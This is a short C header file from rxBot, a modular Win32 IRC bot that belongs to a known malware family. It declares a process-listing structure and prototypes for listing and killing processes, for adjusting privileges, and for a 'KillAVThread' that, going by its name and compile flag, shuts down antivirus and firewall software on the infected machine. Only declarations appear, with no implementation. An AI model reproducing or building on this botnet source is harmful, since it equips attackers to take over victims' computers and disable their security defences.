/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_PROCESS
typedef struct LPROC
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} LPROC;

int listProcesses(SOCKET sock, char *chan, BOOL notice, char *proccess, BOOL killthread=FALSE, BOOL full=false);
DWORD WINAPI listProcessesThread(LPVOID param);
#ifndef NO_AVFW_KILL
DWORD WINAPI KillAVThread(LPVOID param);
#endif
#endif
int killProcess(int pid);
BOOL AdjustPrivileges(char *pPriv, BOOL add);
